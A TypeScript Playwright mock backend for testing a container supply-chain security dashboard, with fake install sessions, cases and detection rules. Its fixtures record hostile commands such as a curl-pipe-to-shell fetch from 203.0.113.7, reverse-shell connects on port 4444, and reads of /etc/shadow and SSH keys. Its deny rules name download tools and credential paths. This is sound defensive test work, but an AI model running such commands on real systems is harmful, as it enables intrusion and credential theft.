import type { Page, Route, WebSocketRoute } from '@playwright/test';
import type {
  IntegrationStatus,
  AuditEntry,
  Blocklist,
  BlockList,
  Case,
  Change,
  ChangesPage,
  DecisionEffect,
  DecisionPreview,
  DemoDecider,
  DemoExplain,
  DemoRun,
  DemoScenario,
  DemoSequence,
  DemoState,
  Event,
  Evidence,
  Info,
  InstallScan,
  InstallSession,
  InstallViolation,
  Level,
  OsvResult,
  PolicyDefaults,
  PolicyView,
  Preview,
  Proposal,
  ProposalChange,
  Rule,
  SequenceHit,
  SequenceStep,
  Stats,
  Summary,
  Timeline,
  Verdict,
  WsMessage, SGInstallSetup } from '../src/lib/types';
import { ACTOR, MockAuth } from './mock-auth';

// 계약(Claude Docs 「API 계약」 탭, 2026-10-15)을 따르는 상태 있는 가짜 백엔드.
// page.route 로 /api/** 를, page.routeWebSocket 으로 /ws/events 를 가로챈다. 실제 서버에는 닿지 않는다.

// 처리자(decidedBy · appliedBy · by)는 로그인한 계정의 표시 이름 — 기본 관리자 표시 이름이 ACTOR (backend auth.Actor.Name)
export { ACTOR };

const ago = (now: number, sec: number) => new Date(now - sec * 1000).toISOString();
const levelOf = (v: Verdict): Level => (!v.matched ? 'normal' : v.action !== 'kill' ? 'alert' : v.enforced ? 'killed' : 'held');
// 11/09 정책 이력(backend review/history.go · api policyView) — 저장 본문이 받는 칸(rules.Rule JSON). 그 밖의 칸은 400(DisallowUnknownFields)
const RULE_KEYS = new Set(['id', 'description', 'kind', 'action', 'dryRun', 'disabled', 'containers', 'denyComms', 'denyArgs', 'denyPaths', 'allowPaths', 'allowPorts', 'allowCidrs', 'denyPorts', 'denyCidrs', 'allowHosts', 'denyHosts', 'directIp', 'denyQtypes', 'maxNameLength', 'maxLabelLength', 'windowSeconds', 'steps']);
const stable = (v: unknown): string =>
  Array.isArray(v)
    ? `[${v.map(stable).join(',')}]`
    : v && typeof v === 'object'
      ? `{${Object.keys(v as object)
          .sort()
          .filter((k) => (v as Record<string, unknown>)[k] !== undefined)
          .map((k) => `${JSON.stringify(k)}:${stable((v as Record<string, unknown>)[k])}`)
          .join(',')}}`
      : JSON.stringify(v);
const sameRule = (a: Rule, b: Rule) => stable(a) === stable(b);
const clone = <T,>(v: T): T => structuredClone(v);

function ev(now: number, sec: number, container: string, image: string, e: Partial<Event> & Pick<Event, 'kind' | 'comm'>): Event {
  // W20: 백엔드처럼 connect 에는 dnsTraced 를 늘 명시한다(가짜 /api/info dnsResolve 'ok' → true)
  const dns = e.kind === 'connect' ? { dnsTraced: true } : {};
  return { timestamp: ago(now, sec), containerId: `${container.replace(/[^a-z0-9]/g, '')}0123456789abcdef`.slice(0, 64), containerName: container, imageName: image, pid: 4242, ...dns, ...e };
}
const kill = (event: Event, ruleId: string, reason: string): Verdict => ({ event, matched: true, ruleId, action: 'kill', reason, enforced: true });
const alert = (event: Event, ruleId: string, reason: string): Verdict => ({ event, matched: true, ruleId, action: 'alert', reason });
const ok = (event: Event): Verdict => ({ event, matched: false });

// ── 10/30 DNS 질의 규칙(kind: dns) · 격리 타임라인 · 시연 — 계약 contract-1030 §1 · §2 · §3 ──
// 48자 hex 라벨(유출 흉내) — deploy/demo scn_dns_exfil 과 같은 이름
export const DNS_EXFIL_NAME = `${'deadbeef'.repeat(6)}.exfil.example`;
// dns 이벤트: dstHost = 질의 이름, qtype = 대문자, dstIp · dstPort 는 컨테이너 네임서버(dnsTraced 는 넣지 않는다)
export function dnsEvent(now: number, sec: number, container: string, image: string, name: string, qtype = 'A', comm = 'python3'): Event {
  return ev(now, sec, container, image, { kind: 'dns', comm, dstHost: name, qtype, dstIp: '127.0.0.11', dstPort: 53 });
}
// WS 로 보낼 dns 판정 — 기본은 runtime-dns-exfil 경고(긴 라벨)
export function dnsVerdict(container: string, o: { name?: string; qtype?: string; ruleId?: string; action?: 'alert' | 'kill'; reason?: string; dryRun?: boolean } = {}): Verdict {
  const name = o.name ?? DNS_EXFIL_NAME;
  const qtype = o.qtype ?? 'A';
  const e = dnsEvent(Date.now(), 0, container, 'demo/x:1', name, qtype);
  const reason = o.reason ?? (qtype === 'TXT' ? `금지 질의 유형: ${name} (${qtype})` : `긴 DNS 라벨(유출 의심): ${name} (라벨 48자 > 40)`);
  if (o.action === 'kill') return { ...kill(e, o.ruleId ?? 'sandbox-dns', reason), enforced: !o.dryRun, dryRun: !!o.dryRun };
  return alert(e, o.ruleId ?? 'runtime-dns-exfil', reason);
}
// 기본 정책 끝에 더해지는 dns 규칙 2개(계약 §1 기본 정책 그대로)
export function dnsRules(): Rule[] {
  return [
    { id: 'runtime-dns-exfil', description: 'DNS 질의로 데이터를 실어 보내는 패턴(긴 라벨 · 긴 이름 · TXT 질의). 런타임은 경고만', kind: 'dns', action: 'alert', maxLabelLength: 40, maxNameLength: 120, denyQtypes: ['TXT'] },
    {
      id: 'sandbox-dns', description: '설치 샌드박스는 패키지 레지스트리·GitHub 외 도메인 질의 자체를 격리 (연결 전 유출 · DNS 터널링 차단). sg-vm 실측 전까지 시험 운영',
      kind: 'dns', action: 'kill', dryRun: true, containers: ['sg-install-*'],
      allowHosts: ['pypi.org', 'pythonhosted.org', 'registry.npmjs.org', 'registry.yarnpkg.com', 'crates.io', 'static.crates.io', 'github.com', 'githubusercontent.com', 'deb.debian.org', 'dl-cdn.alpinelinux.org'],
      maxLabelLength: 40,
    },
  ];
}
// ── 11/04 연쇄 규칙(kind: sequence) — backend policies/default.yaml chain-download-secrets · model.SequenceHit ──
export const SEQ_RULE_ID = 'chain-download-secrets';
export const SEQ_PATHS = ['/etc/shadow', '/root/.ssh/', '/home/*/.ssh/*', '/root/.aws/', '/var/run/secrets/', '/run/secrets/', '/root/.netrc', '/root/.git-credentials', '/root/.docker/config.json', '/root/.kube/config'];
export function sequenceRule(): Rule {
  return {
    id: SEQ_RULE_ID,
    description: '같은 컨테이너에서 10초 안에 다운로더 실행 → 외부 연결 → 자격 증명 파일 접근(하나씩은 약한 신호라도 이어지면 유출 시도). sg-vm 실측 전까지 시험 운영',
    kind: 'sequence',
    action: 'kill',
    dryRun: true,
    windowSeconds: 10,
    steps: [
      { kind: 'exec', denyComms: ['curl', 'wget'] },
      { kind: 'connect', allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '::1'] },
      { kind: 'open', denyPaths: [...SEQ_PATHS] },
    ],
  };
}
// 완성된 연쇄(엔진 Observe) — exec wget(t0) → connect 203.0.113.7:80(+2.1초) → open /root/.netrc(+2.4초)
export function sequenceHit(t0: number, o: { dryRun?: boolean; path?: string } = {}): SequenceHit {
  const at = (ms: number) => new Date(t0 + ms).toISOString();
  return {
    ruleId: SEQ_RULE_ID,
    action: 'kill',
    ...(o.dryRun === false ? {} : { dryRun: true }),
    steps: [
      { kind: 'exec', timestamp: at(0), comm: 'wget', pid: 4301, detail: 'wget -q http://203.0.113.7/x' },
      { kind: 'connect', timestamp: at(2100), comm: 'wget', pid: 4301, detail: '203.0.113.7:80' },
      { kind: 'open', timestamp: at(2400), comm: 'python3', pid: 4302, detail: o.path ?? '/root/.netrc' },
    ],
  };
}
// backend rules.Rule.Validate 의 연쇄 검사(V2~V8) 문구 — 저장(POST /api/policies) 422 재현용(첫 오류들만 줄바꿈으로, errors.Join 과 같은 모양)
const COND_KEYS = ['denyComms', 'denyArgs', 'denyPaths', 'allowPaths', 'allowPorts', 'allowCidrs', 'denyPorts', 'denyCidrs', 'allowHosts', 'denyHosts', 'denyQtypes', 'directIp', 'maxNameLength', 'maxLabelLength'];
const hasCond = (r: Record<string, unknown>) => COND_KEYS.some((k) => { const v = r[k]; return Array.isArray(v) ? v.length > 0 : v !== undefined && v !== '' && v !== 0; });
export function validateSequence(r: Rule): string[] {
  const errs: string[] = [];
  if (r.kind !== 'sequence') {
    if (r.steps?.length || r.windowSeconds) errs.push('steps · windowSeconds 는 sequence 규칙에서만');
    return errs;
  }
  const n = r.steps?.length ?? 0;
  if (n < 2 || n > 5) errs.push(`steps: 단계 2~5개 (지금 ${n}개)`);
  const w = r.windowSeconds ?? 0;
  if (w < 1 || w > 60) errs.push(`windowSeconds ${w}: 1~60`);
  if (hasCond(r as unknown as Record<string, unknown>)) errs.push('sequence 규칙 최상위에는 조건을 쓸 수 없음(조건은 steps 에)');
  (r.steps ?? []).forEach((st, i) => {
    const s = st as unknown as Record<string, unknown>;
    if (!['exec', 'open', 'connect', 'dns'].includes(String(s.kind))) return void errs.push(`steps[${i}]: kind ${JSON.stringify(s.kind ?? '')}: exec | open | connect | dns`);
    if (['id', 'description', 'action', 'dryRun', 'disabled', 'containers', 'steps', 'windowSeconds'].some((k) => s[k] !== undefined))
      errs.push(`steps[${i}]: 단계에는 kind 와 조건만 쓸 수 있음(id · description · action · dryRun · disabled · containers · steps · windowSeconds 는 쓸 수 없음)`);
    if (!hasCond(s)) errs.push(`steps[${i}]: ${String(s.kind)} 규칙에 조건이 없음`);
  });
  return errs;
}
// 격리 타임라인(계약 §3) — 탐지 기준 ms 오프셋. 키를 null 로 주면 뺀다(없는 구간 「—」 재현)
export const TL = { matchMs: 12, evidenceStartMs: 15, evidenceDoneMs: 310, killMs: 420, notifyMs: 431 };
export function timeline(detectedAt: number, o: Partial<{ matchMs: number; evidenceStartMs: number | null; evidenceDoneMs: number | null; killMs: number | null; notifyMs: number | null }> = {}): Timeline {
  const at = (ms: number) => new Date(detectedAt + ms).toISOString();
  const v = { ...TL, ...o };
  const t: Timeline = { detectedAt: at(0), matchedAt: at(v.matchMs) };
  if (v.evidenceStartMs != null) t.evidenceStartedAt = at(v.evidenceStartMs);
  if (v.evidenceDoneMs != null) t.evidenceDoneAt = at(v.evidenceDoneMs);
  if (v.killMs != null) t.killedAt = at(v.killMs);
  if (v.notifyMs != null) t.notifiedAt = at(v.notifyMs);
  return t;
}
// R3 11/04: 백엔드 GET /api/demo scenarios 와 같은 8개(정상 대조군 benign · 연쇄 chain 포함)
export const DEMO_SCENARIOS: DemoScenario[] = ['all', 'shell', 'revshell', 'direct-ip', 'domain', 'dns-exfil', 'benign', 'chain'];
// Run 객체(계약 §2) — unix 초 기준 id · 컨테이너 이름
export function demoRun(scenario: DemoScenario, installId: string, unix = Math.floor(Date.now() / 1000)): DemoRun {
  return { id: `demo-${unix}`, scenario, container: `sg-install-demo-${unix}`, installId, startedAt: new Date(unix * 1000).toISOString(), finishedAt: null, status: 'running', exitCode: null, simulated: true };
}
// SSE 본문: 시작 주석 · 중간 ping 주석을 섞는다(백엔드 api/chat.go 와 같은 모양)
export const sseBody = (events: [string, unknown][]) =>
  ': start\n\n' + events.map(([e, d], i) => (i === 1 ? ': ping\n\n' : '') + `event: ${e}\ndata: ${JSON.stringify(d)}\n\n`).join('');

// 11/04 종합 판정: 설치 세션 응답의 scan(읽을 때 계산) — 계약 모양. 건너뜀은 id '' · status skipped
export function installScan(o: Partial<InstallScan> & Pick<InstallScan, 'status' | 'label'>): InstallScan {
  return { id: '', version: '', riskScore: null, installThreats: 0, threats: 0, vulnCount: 0, error: '', skip: '', reused: false, ...o };
}
const INSTALL_CTR = 'sg-install-pip-1792043525-24739';
const PYIMG = 'python:3.12-slim';

export class MockBackend {
  now = Date.now();
  // 10/20: dnsResolve · notify(알림 채널 상태 — 호스트만) — 메인 백엔드 /api/info 와 같은 모양
  info: Info = {
    source: 'mock',
    gadgets: ['exec', 'open', 'connect'],
    enforceKill: true,
    authRequired: false,
    gadgetVersion: 'v0.56.1',
    watchContainers: [],
    ignoreContainers: ['supplyguard-*'],
    dnsResolve: 'ok',
    // 10/20: AI 도우미(/api/chat) 켜짐 여부 — 기본은 꺼짐(기존 시나리오는 가이드 탭 하나). 켜는 시나리오는 assistant-chat-1020.spec
    chat: false,
    notify: { enabled: true, channels: [{ name: 'webhook', host: 'hooks.example.test', sent: 3, failed: 0, dropped: 0, queued: 0 }], sent: 3, failed: 0, dropped: 0, suppressed: 0 },
  };
  // 라우트 자체가 없는 것처럼(404 + 텍스트) 굴 경로 접두사 — 「백엔드 미지원」 재현
  unsupported = new Set<string>();
  osvFail = false;
  // 목록 응답에서 violations · activity 를 빼고 violationCount 만 준다(계약: 상세에만 있을 수 있음)
  listOmitsDetail = false;
  requests: { method: string; path: string; auth: string | null; body?: string }[] = [];
  // 10/20 인증(W16): 기본은 관리자 active 세션 · OTP 꺼짐. 로그인 단계 · 계정 · 라이선스 · 인증 감사도 여기서
  auth = new MockAuth();
  // /api/chat 가짜 SSE(메인 백엔드 api/chat.go 계약). status 가 200 이 아니면 시작 전 JSON 오류 {error}
  chatReply: { status?: number; error?: string; events?: [string, unknown][] } | null = null;
  ws: WebSocketRoute | null = null;
  notifyTests = 0;
  // W18: 새 기본 규칙(GET /api/policies/defaults) — 기본은 차이 없음(띠 없음) · kill 직전 증거(GET /api/evidence)
  policyDefaults: PolicyDefaults = { missing: [], differs: [] };
  evidence: Evidence[] = [];
  // W19: 실시간 끊김 재현 — wsRefuse 동안 새 연결을 바로 닫고, dropWs() 는 지금 연결을 끊는다. failing: 경로 → 상태 코드(최초 로드 실패 재현)
  wsRefuse = false;
  failing = new Map<string, number>();
  // 10/30 시연(계약 §2 mock 소스): info.demo 가 true 일 때만 /api/demo 경로가 있다. demoDown → 503, demoRefused → 거부 세션(202 refused)
  demo: DemoState = { enabled: false, scenarios: DEMO_SCENARIOS, running: null, last: null };
  // 11/06 연동(GET /api/integration · POST /api/integration/test) — 백엔드 internal/integration 과 같은 모양. integrationDown → 503
  // 11/09 설치 검사 「사용 방법」 — 기본은 make dev(mock): 토큰 없이 보고 받음 · 백엔드 :8000
  sgSetup: SGInstallSetup = { download: '/api/tools/sg-install', api: 'http://127.0.0.1:8000', tokenRequired: false, reporting: true };
  integration: IntegrationStatus = {
    env: { source: 'mock', os: '', kernel: '', enforceKill: true, enforceNames: ['sg-install-*'], labelWatch: 'supplyguard.watch', labelEnforce: 'supplyguard.enforce', probeImage: 'busybox:1.36', testable: true },
    containers: [
      { id: 'c-pkg', name: 'pkg-reqeusts', image: 'demo/reqeusts:1.0.2', ignored: false, watched: true, watchBy: 'all', enforce: true, enforceBy: 'label' },
      { id: 'c-web', name: 'web-api', image: 'node:22-alpine', ignored: false, watched: true, watchBy: 'all', enforce: false },
      { id: 'c-worker', name: 'worker', image: 'python:3.12-slim', ignored: false, watched: true, watchBy: 'all', enforce: false },
    ],
    test: null,
  };
  integrationDown = false;
  integrationTestMs = 1200;
  // 11/10 감시 중 컨테이너 상세(GET /api/integration/containers/{id}) — 목록 값에 덧붙일 inspect 값(상태 · 시작 시각 · 포트 · 라벨).
  //   목록에 없는 id · detailMissing(목록엔 있지만 방금 종료) → 404 + 서버 문장. 환경 변수는 백엔드처럼 담지 않는다
  containerDetails: Record<string, { state?: string; startedAt?: string; restartCount?: number; imageId?: string; ports?: { port: string; hostIp?: string; hostPort?: string }[]; labels?: Record<string, string>; detailError?: string }> = {};
  detailMissing = new Set<string>();
  demoDown = false;
  demoRefused = false;
  demoStepMs = 250; // 모의 재생 간격
  // R3 11/04: GET /api/demo 의 Run.explain(backend demo/explain.go 모양) — false 면 옛 백엔드처럼 explain 없음. 테스트가 run.explain 을 직접 넣으면 그대로 둔다
  demoExplain = true;
  private demoTimers: number[] = [];
  // 10/30: 수집량에 dns 를 넣을지(enableDns) — 기본은 옛 백엔드처럼 없음
  dnsCollected = false;
  // R4 11/04: 감사 로그 쪽 번호 — offset 이 있으면 {items, total, offset, limit}(backend api.AuditPage). auditLegacy 면 옛 백엔드처럼 늘 배열(offset 무시) · auditDelayMs 만큼 늦게 답한다(진행 띠)
  auditLegacy = false;
  auditDelayMs = 0;
  // 감사 행을 n 개 더(쪽 번호 확인용) — 기존 행보다 오래된 alert/kill 을 번갈아
  seedAudit(n: number) {
    const low = Math.min(...this.audit.map((a) => a.id));
    const last = this.audit[this.audit.length - 1];
    const t0 = new Date(last.event.timestamp).getTime();
    for (let i = 1; i <= n; i++) {
      const at = new Date(t0 - i * 60_000).toISOString();
      const e = { ...last.event, timestamp: at, containerName: `svc-${String(i).padStart(2, '0')}` };
      this.audit.push({ ...last, id: low - i, event: e, action: (i % 3 ? 'alert' : 'kill') as AuditEntry['action'], dryRun: false, enforced: i % 3 === 0, enforceError: undefined, caseId: null, install: null });
    }
  }
  dropWs() {
    void this.ws?.close({ code: 1006, reason: 'drop' });
  }
  private seq = 100;

  rules: Rule[] = [
    { id: 'sensitive-files', description: '자격 증명·계정 파일 접근', kind: 'open', action: 'kill', denyPaths: ['/etc/shadow', '/root/.ssh/', '/home/*/.ssh/*'] },
    { id: 'no-shell-download', description: '셸 다운로더 실행', kind: 'exec', action: 'kill', denyComms: ['curl', 'wget'] },
    { id: 'pipe-to-shell', description: 'curl | sh', kind: 'exec', action: 'kill', denyArgs: ['| sh', '| bash'] },
    { id: 'reverse-shell-ports', description: '리버스 셸 포트', kind: 'connect', action: 'kill', denyPorts: [4444, 1337] },
    // backend/policies/default.yaml 과 같게 — allowHosts 없음(오탐 예외는 allowCidrs IP/32)
    { id: 'egress-allowlist', description: '허용 목적지 외 통신', kind: 'connect', action: 'alert', allowPorts: [443, 80, 53], allowCidrs: ['10.0.0.0/8'] },
    { id: 'sandbox-egress', description: '설치 중 외부 통신', kind: 'connect', action: 'kill', containers: ['sg-install-*'], allowHosts: ['pypi.org', 'files.pythonhosted.org'] },
    { id: 'sandbox-secrets', description: '설치 중 비밀 파일', kind: 'open', action: 'kill', containers: ['sg-install-*'], denyPaths: ['/root/.ssh/', '/etc/shadow'] },
    { id: 'blocklist-hosts', description: '차단 목록 도메인 (시스템)', kind: 'connect', action: 'kill', denyHosts: ['cdn.colourama.test'] },
  ];

  installs: InstallSession[];
  cases: Case[];
  proposals: Proposal[];
  blocklist: Blocklist;
  changes: Change[];
  audit: AuditEntry[];
  recent: Verdict[];
  stats: Stats;
  // 종합(10/16): 1분 단위 수집량 — 최근 26시간, 결정적인 값
  collected: { minute: number; exec: number; open: number; connect: number; dns?: number }[] = [];
  osv: Record<string, number> = { 'PyPI:reqeusts': 0, 'PyPI:requests': 16, 'npm:tiny-git-dep': 0, 'PyPI:colourama': 0 };

  constructor() {
    const now = this.now;
    const reqViolations: InstallViolation[] = [
      { ...kill(ev(now, 610, INSTALL_CTR, PYIMG, { kind: 'exec', comm: 'sh', args: 'sh -c curl -s http://203.0.113.7/p.sh | sh' }), 'pipe-to-shell', '파이프로 셸 실행'), count: 1 },
      { ...kill(ev(now, 610, INSTALL_CTR, PYIMG, { kind: 'exec', comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh' }), 'no-shell-download', '셸 다운로더'), count: 1 },
      { ...kill(ev(now, 609, INSTALL_CTR, PYIMG, { kind: 'open', comm: 'python', path: '/root/.ssh/id_rsa' }), 'sandbox-secrets', '비밀 파일'), count: 1 },
      { ...kill(ev(now, 609, INSTALL_CTR, PYIMG, { kind: 'open', comm: 'python', path: '/etc/shadow' }), 'sensitive-files', '계정 파일'), count: 1 },
      { ...kill(ev(now, 608, INSTALL_CTR, PYIMG, { kind: 'connect', comm: 'python', dstIp: '203.0.113.7', dstPort: 8081, dstHost: 'cdn.reqeusts-update.test' }), 'sandbox-egress', '설치 중 외부 통신'), count: 1 },
      { ...kill(ev(now, 608, INSTALL_CTR, PYIMG, { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444, dstHost: 'cdn.reqeusts-update.test' }), 'reverse-shell-ports', '리버스 셸 포트'), count: 1 },
    ];
    const npmCtr = 'sg-install-npm-1792043001-11873';
    const gitViolation: InstallViolation = {
      ...alert(ev(now, 900, npmCtr, 'node:22-slim', { kind: 'connect', comm: 'git', dstIp: '140.82.112.3', dstPort: 9418, dstHost: 'github.com' }), 'egress-allowlist', '허용 목적지 외 통신'),
      count: 2,
    };
    const base = (id: string, manager: InstallSession['manager'], pkgs: string[], startSec: number, durSec: number | null, status: InstallSession['status'], extra: Partial<InstallSession> = {}): InstallSession => ({
      id,
      manager,
      packages: pkgs,
      container: `sg-install-${manager}-${1792040000 + startSec}-${id.slice(-4)}`,
      containerId: `${id}abcdef0123456789`,
      image: manager === 'pip' ? PYIMG : manager === 'npm' ? 'node:22-slim' : 'rust:1-slim',
      startedAt: ago(now, startSec),
      finishedAt: durSec === null ? null : ago(now, startSec - durSec),
      exitCode: durSec === null ? null : 0,
      status,
      caseId: null,
      refusedBy: null,
      violations: [],
      activity: { kinds: { exec: 2, open: 14, connect: 3 }, hosts: [{ host: 'pypi.org', ip: '151.101.0.223', port: 443, count: 3, level: 'normal' }], programs: [{ comm: manager, args: `${manager} install ${pkgs.join(' ')}`, count: 1, level: 'normal' }] },
      ...extra,
    });
    this.installs = [
      base('ins-0013', 'npm', ['left-pad'], 20, null, 'running', { scanId: 'scan-0103', scan: installScan({ id: 'scan-0103', status: 'running', label: 'npm left-pad', version: '1.3.0' }) }),
      base('ins-0012', 'pip', ['./reqeusts'], 612, 4, 'isolated', {
        container: INSTALL_CTR,
        exitCode: 137,
        caseId: 'case-0004',
        scanId: null,
        scanSkip: 'local', // 11/04: 로컬 패키지 — 정적 검사 건너뜀 → 지금의 OSV 칸(시연 대본 1:15)
        scan: installScan({ status: 'skipped', label: 'pip ./reqeusts', skip: 'local' }),
        violations: reqViolations,
        activity: {
          kinds: { exec: 3, open: 2, connect: 5 },
          hosts: [
            { host: 'pypi.org', ip: '151.101.0.223', port: 443, count: 3, level: 'normal' },
            { host: 'cdn.reqeusts-update.test', ip: '203.0.113.7', port: 8081, count: 1, level: 'killed' },
            { host: 'cdn.reqeusts-update.test', ip: '203.0.113.7', port: 4444, count: 1, level: 'killed' },
          ],
          programs: [
            { comm: 'pip', args: 'pip install --no-cache-dir ./reqeusts', count: 1, level: 'normal' },
            { comm: 'sh', args: 'sh -c curl -s http://203.0.113.7/p.sh | sh', count: 1, level: 'killed' },
            { comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh', count: 1, level: 'killed' },
          ],
        },
      }),
      base('ins-0011', 'npm', ['tiny-git-dep'], 905, 9, 'warned', {
        container: npmCtr,
        caseId: 'case-0003',
        violations: [gitViolation],
        scanId: 'scan-0102',
        scan: installScan({ id: 'scan-0102', status: 'done', verdict: 'clean', label: 'npm tiny-git-dep', version: '1.0.0', riskScore: 0 }), // 런타임 경고 + 정적 정상 → 엇갈림 한 줄
      }),
      base('ins-0010', 'pip', ['requests'], 1000, 6, 'passed', {
        scanId: 'scan-0101',
        scan: installScan({ id: 'scan-0101', status: 'done', verdict: 'clean', label: 'pip requests', version: '2.32.3', riskScore: 0, reused: true }), // 24시간 안 검사 재사용
      }),
      base('ins-0009', 'cargo', ['ripgrep'], 1100, 30, 'passed', { scanId: null, scanSkip: 'unsupported', scan: installScan({ status: 'skipped', label: 'cargo ripgrep', skip: 'unsupported' }) }),
      base('ins-0008', 'pip', ['flask'], 1200, null, 'unknown', {
        containerExitedAt: ago(now, 1190),
        scanId: 'scan-0100',
        scan: installScan({ id: 'scan-0100', status: 'failed', label: 'pip flask', version: '3.1.0', error: 'GuardDog 시간 초과(120초)' }),
      }),
      base('ins-0007', 'pip', ['numpy==1.21.0'], 1300, 12, 'failed', {
        exitCode: 1,
        scanId: 'scan-0099',
        scan: installScan({ id: 'scan-0099', status: 'done', verdict: 'vulnerable', label: 'pip numpy==1.21.0', version: '1.21.0', riskScore: 1.5, vulnCount: 5 }),
      }),
      base('ins-0006', 'pip', ['colourama'], 1500, 3, 'isolated', {
        exitCode: 137,
        caseId: 'case-0002',
        violations: [{ ...kill(ev(now, 1498, 'sg-install-pip-x', PYIMG, { kind: 'connect', comm: 'python', dstIp: '203.0.113.9', dstPort: 443, dstHost: 'cdn.colourama.test' }), 'sandbox-egress', '설치 중 외부 통신'), count: 2 }],
      }),
    ];
    this.cases = [
      { id: 'case-0005', source: 'runtime', installId: null, container: 'pkg-reqeusts', label: 'pkg-reqeusts', image: 'demo/reqeusts:1.0.2', package: null, openedAt: ago(now, 60), level: 'killed', violations: 5, ruleIds: ['pipe-to-shell', 'no-shell-download', 'sensitive-files', 'egress-allowlist', 'reverse-shell-ports'], state: 'open', decision: 'pending', decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null },
      { id: 'case-0004', source: 'install', installId: 'ins-0012', container: INSTALL_CTR, label: 'pip ./reqeusts', image: PYIMG, package: 'pip:reqeusts', openedAt: ago(now, 608), level: 'killed', violations: 6, ruleIds: ['pipe-to-shell', 'no-shell-download', 'sandbox-secrets', 'sensitive-files', 'sandbox-egress', 'reverse-shell-ports'], state: 'open', decision: 'pending', decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null },
      { id: 'case-0003', source: 'install', installId: 'ins-0011', container: npmCtr, label: 'npm tiny-git-dep', image: 'node:22-slim', package: 'npm:tiny-git-dep', openedAt: ago(now, 900), level: 'alert', violations: 2, ruleIds: ['egress-allowlist'], state: 'open', decision: 'pending', decidedAt: null, decidedBy: null, note: '', proposalId: null, closedAt: null },
      { id: 'case-0002', source: 'install', installId: 'ins-0006', container: 'sg-install-pip-x', label: 'pip colourama', image: PYIMG, package: 'pip:colourama', openedAt: ago(now, 1498), level: 'killed', violations: 2, ruleIds: ['sandbox-egress'], state: 'closed', decision: 'malicious', decidedAt: ago(now, 1400), decidedBy: ACTOR, note: '타이포스쿼팅', proposalId: 'prop-0001', closedAt: ago(now, 1390) },
    ];
    this.proposals = [
      { id: 'prop-0001', caseId: 'case-0002', decision: 'malicious', state: 'applied', createdAt: ago(now, 1400), createdBy: ACTOR, appliedAt: ago(now, 1390), appliedBy: ACTOR, changes: [{ op: 'block', list: 'packages', value: 'pip:colourama' }, { op: 'block', list: 'hosts', value: 'cdn.colourama.test' }], notes: [] },
    ];
    this.blocklist = {
      packages: [{ value: 'pip:colourama', caseId: 'case-0002', at: ago(now, 1390), by: ACTOR }],
      images: [],
      hosts: [{ value: 'cdn.colourama.test', caseId: 'case-0002', at: ago(now, 1390), by: ACTOR }],
    };
    this.changes = [{ id: 'chg-0001', at: ago(now, 1390), by: ACTOR, kind: 'proposal_applied', caseId: 'case-0002', proposalId: 'prop-0001', summary: '패키지 pip:colourama 차단 · 도메인 1개 차단', ruleIds: ['blocklist-hosts'] }];

    // 런타임 공격(pkg-reqeusts) + 정상 컨테이너 + 설치 검사 컨테이너 이벤트
    const RT = 'pkg-reqeusts';
    const RTIMG = 'demo/reqeusts:1.0.2';
    const runtime: Verdict[] = [
      kill(ev(now, 58, RT, RTIMG, { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444, dstHost: 'cdn.reqeusts-update.test' }), 'reverse-shell-ports', '리버스 셸 포트 4444'),
      alert(ev(now, 58, RT, RTIMG, { kind: 'connect', comm: 'python', dstIp: '203.0.113.7', dstPort: 8081, dstHost: 'cdn.reqeusts-update.test' }), 'egress-allowlist', '허용 목적지 외 통신'),
      kill(ev(now, 59, RT, RTIMG, { kind: 'open', comm: 'python', path: '/etc/shadow' }), 'sensitive-files', '계정 파일 접근'),
      kill(ev(now, 59, RT, RTIMG, { kind: 'exec', comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh' }), 'no-shell-download', '셸 다운로더'),
      kill(ev(now, 60, RT, RTIMG, { kind: 'exec', comm: 'sh', args: 'sh -c curl -s http://203.0.113.7/p.sh | sh' }), 'pipe-to-shell', '파이프로 셸 실행'),
    ];
    const normal: Verdict[] = [
      ok(ev(now, 5, 'web-api', 'demo/web-api:2.3', { kind: 'open', comm: 'python', path: '/app/config.yaml' })),
      ok(ev(now, 6, 'web-api', 'demo/web-api:2.3', { kind: 'connect', comm: 'python', dstIp: '10.0.0.5', dstPort: 5432 })),
      ok(ev(now, 7, 'worker', 'demo/worker:1.4', { kind: 'exec', comm: 'node', args: 'node jobs/run.js' })),
      ok(ev(now, 8, 'worker', 'demo/worker:1.4', { kind: 'connect', comm: 'node', dstIp: '151.101.0.223', dstPort: 443, dstHost: 'registry.npmjs.org' })),
    ];
    const sandbox: Verdict[] = [reqViolations[0], reqViolations[5]].map((v) => {
      const { count: _c, ...rest } = v;
      void _c;
      return { ...rest, event: { ...rest.event, timestamp: ago(now, 30) } };
    });
    this.recent = [...normal, ...sandbox, ...runtime];
    const m0 = Math.floor(now / 60000);
    for (let m = m0 - 26 * 60; m <= m0; m++) this.collected.push({ minute: m, exec: 2 + (m % 3), open: 10 + (m % 7), connect: 3 + (m % 5) });

    // 감사 로그: 위반만 저장(+caseId · install)
    const auditRows: Omit<AuditEntry, 'id'>[] = [
      // 경고도 같은 컨테이너의 열린 런타임 건에 묶인다(결정 2026-10-15)
      ...runtime.map((v) => ({ ...v, caseId: 'case-0005', install: null })),
      ...reqViolations.map(({ count: _c, ...v }) => (void _c, { ...v, caseId: 'case-0004', install: { id: 'ins-0012', label: 'pip ./reqeusts' } })),
      { ...gitViolation, event: { ...gitViolation.event, timestamp: ago(now, 902) }, caseId: 'case-0003', install: { id: 'ins-0011', label: 'npm tiny-git-dep' } },
      { ...gitViolation, caseId: 'case-0003', install: { id: 'ins-0011', label: 'npm tiny-git-dep' } },
    ];
    auditRows.sort((a, b) => b.event.timestamp.localeCompare(a.event.timestamp));
    this.audit = auditRows.map((r, i) => ({ ...r, id: 200 - i }));

    const trend = Array.from({ length: 60 }, (_, i) => ({ t: ago(now, (59 - i) * 5), exec: 3, open: 8, connect: 4, violations: i % 12 === 0 ? 6 : i % 7 === 0 ? 1 : 0 }));
    this.stats = {
      timestamp: new Date(now).toISOString(),
      totalEvents: 12890,
      eventsLastMinute: 540,
      eventsPerSec: 9.6,
      totalViolations: 90,
      riskScore: 0,
      killed: [{ id: 'c1', name: RT, at: ago(now, 58) }, { id: 'c2', name: INSTALL_CTR, at: ago(now, 608) }],
